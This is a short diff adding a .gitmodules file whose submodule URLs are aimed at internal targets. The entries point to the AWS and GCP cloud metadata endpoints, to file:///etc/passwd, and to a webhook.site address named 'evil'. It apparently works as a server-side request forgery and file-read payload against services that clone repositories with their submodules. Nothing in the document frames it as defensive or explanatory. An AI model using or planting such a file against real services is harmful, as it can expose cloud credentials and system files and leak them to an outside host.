@@ -1,0 +1,12 @@
+[submodule "evil"]
+	path = evil
+	url = http://webhook.site/053e00d8-66dd-4ce8-98f0-6b445a46c1c7
+[submodule "aws"]
+	path = aws
+	url = http://169.254.169.254/latest/meta-data/
+[submodule "gcp"]
+	path = gcp
+	url = http://metadata.google.internal/computeMetadata/v1/
+[submodule "file"]
+	path = file
+	url = file:///etc/passwd
